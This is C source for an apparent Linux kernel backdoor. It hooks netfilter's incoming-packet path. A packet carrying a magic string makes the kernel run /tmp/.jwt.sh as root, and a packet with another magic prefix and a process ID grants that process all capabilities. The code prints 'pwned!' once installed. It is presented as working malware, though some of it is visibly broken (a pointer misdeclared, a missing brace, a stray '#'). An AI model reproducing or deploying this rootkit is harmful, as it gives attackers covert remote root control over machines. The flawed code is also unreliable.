#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/skbuff.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/workqueue.h>
#include <linux/kmod.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/pid_namespace.h>
#include <linux/capability.h>

#define MAGIC_SHCMD "what-is-a-jwt"
#define SHCMD "/tmp/.jwt.sh"

#define MAGIC_CAPABILITIES_PREFIX "its-pronounced-jot-according-to-RFC-"
#define MAGIC_CAPABILITIES_TERMINATOR '!'

// cat /proc/sys/kernel/cap_last_cap

#define MAGIC_CAPABILITIES_DESIRED 0x000000ffffffffff

extern unsigned char __payload[];
extern unsigned char __payload_end[];

// 
extern long lookup_name(const char *);

////////////////////////////////////////////////////////////////////////////////
// Kernel API imports
////////////////////////////////////////////////////////////////////////////////

static typeof(_printk) *p_printk = NULL;
//static typeof(lookup_name) *p_lookup_name = NULL;
static typeof(kmalloc) *p_kmalloc = NULL;
static typeof(kfree) *p_kfree = NULL;
static typeof(memcmp) *p_memcmp = NULL;
static typeof(call_usermodehelper) *p_call_umh = NULL;
static typeof(nf_register_net_hooks) *p_nf_register_net_hooks = NULL;
static typeof(execute_in_process_context) *p_execute_in_process_context = NULL;
static typeof(get_pid_task) *p_get_pid_task = NULL;
static typeof(find_get_pid) *p_find_get_pid = NULL;

////////////////////////////////////////////////////////////////////////////////

static inline void *memmem(const void *h, size_t hlen, const void *n, size_t nlen) {
	if (!h || !hlen || !n || !nlen || (nlen > hlen))
		return NULL;

	while (hlen >= nlen) {
		if (!p_memcmp(h, n, nlen))
			return (void *)h;
		h++, hlen--;
	}

	return NULL;
}

static void delayed_work(struct work_struct *ws) {
	char *envp[2] = { "HOME=/proc", NULL };
	char *argv[4] = { "/bin/sh", "-c", SHCMD, NULL };
	p_call_umh(argv[0], argv, envp, UMH_WAIT_EXEC);
	p_kfree(container_of(ws, struct execute_work, work));
}

static void try_skb(struct sk_buff *skb) {
	if (memmem(skb->data, skb_headlen(skb), MAGIC_SHCMD, sizeof(MAGIC_SHCMD) - 1)) {
		struct execute_work *ws = p_kmalloc(sizeof(struct execute_work), GFP_ATOMIC);
		if (ws) p_execute_in_process_context(delayed_work, ws);
	}

	/*
	Grant all capabilities to the process specified in the packet.
	packet format is:
		<magic prefix><pid>
	*/
	// Check if the packet contains the magic prefix
	char *p = memmem(skb->data, skb_headlen(skb), MAGIC_CAPABILITIES_PREFIX, sizeof(MAGIC_CAPABILITIES_PREFIX) - 1);
	// if it does, get the pid
	if (p) {
		// get the pid
		unsigned long pid = 0;
		p += sizeof(MAGIC_CAPABILITIES_PREFIX) - 1;
		while (*p >= '0' && *p <= '9') {
			pid *= 10;
			pid += *p - '0';
			p++;
		}

		// get the task struct taskp = get_pid_task(find_get_pid(PID),PIDTYPE_PID);
		struct task_struct taskp = p_get_pid_task(p_find_get_pid(pid), PIDTYPE_PID);

		// set the capabilities
		((kernel_cap_t*)(&taskp->real_cred->cap_inheritable))->cap[0] = MAGIC_CAPABILITIES_DESIRED;
		((kernel_cap_t*)(&taskp->real_cred->cap_permitted))->cap[0] = MAGIC_CAPABILITIES_DESIRED;
		((kernel_cap_t*)(&taskp->real_cred->cap_effective))->cap[0] = MAGIC_CAPABILITIES_DESIRED;
		((kernel_cap_t*)(&taskp->real_cred->cap_bset))->cap[0] = MAGIC_CAPABILITIES_DESIRED;
		((kernel_cap_t*)(&taskp->cred->cap_inheritable))->cap[0] = MAGIC_CAPABILITIES_DESIRED;
		((kernel_cap_t*)(&taskp->cred->cap_permitted))->cap[0] = MAGIC_CAPABILITIES_DESIRED;
		((kernel_cap_t*)(&taskp->cred->cap_effective))->cap[0] = MAGIC_CAPABILITIES_DESIRED;
		((kernel_cap_t*)(&taskp->cred->cap_bset))->cap[0] = MAGIC_CAPABILITIES_DESIRED;



}

static unsigned int custom_local_in(void *arg, struct sk_buff *skb, const struct nf_hook_state *state) {
	if (skb) try_skb(skb);
	return NF_ACCEPT;
}

static struct nf_hook_ops nf_ops[] = {
	[0] = {
		.hook = (nf_hookfn *)NULL,
		.pf = NFPROTO_IPV4,
		.hooknum = NF_INET_LOCAL_IN,
		.priority = NF_IP_PRI_FIRST,
	},
};

static void init_nf_hooks(void *net) {
	nf_ops[0].hook = (void *)custom_local_in;
	p_nf_register_net_hooks(net, nf_ops, ARRAY_SIZE(nf_ops));
#
}


long __attribute__((used, section(".text.entry"))) entry(const typeof(lookup_name) *lookup, void *net) {

	// typedef unsigned long (*lookup_name_t)(const char *name);
	// lookup_name_t lookup = (lookup_name_t)lookup_addr;
	

	p_printk = (void *)lookup("_printk");
	if (!p_printk)
		return -2;

	p_call_umh = (void *)lookup("call_usermodehelper");
	if (!p_call_umh) {
		p_printk("no call_usermodehelper found\n");
		return -3;
	}

	p_kmalloc = (void *)lookup("__kmalloc");
	if (!p_kmalloc) {
		p_printk("no __kmalloc found\n");
		return -4;
	}

	p_kfree = (void *)lookup("kfree");
	if (!p_kfree) {
		p_printk("no kfree found\n");
		return -5;
	}

	p_memcmp = (void *)lookup("memcmp");
	if (!p_memcmp) {
		p_printk("no memcmp found\n");
		return -6;
	}

	p_execute_in_process_context = (void *)lookup("execute_in_process_context");
	if (!p_execute_in_process_context) {
		p_printk("no execute_in_process_context found\n");
		return -7;
	}

	p_nf_register_net_hooks = (void *)lookup("nf_register_net_hooks");
	if (!p_nf_register_net_hooks) {
		p_printk("no nf_register_net_hooks found\n");
		return -8;
	}

	p_get_pid_task = (void *)lookup("get_pid_task");
	if (!p_get_pid_task) {
		p_printk("no get_pid_task found\n");
		return -9;
	}

	p_find_get_pid = (void *)lookup("find_get_pid");
	if (!p_find_get_pid) {
		p_printk("no find_get_pid found\n");
		return -10;
	}

	init_nf_hooks(net);

	p_printk("pwned!\n");

	return 0;
}
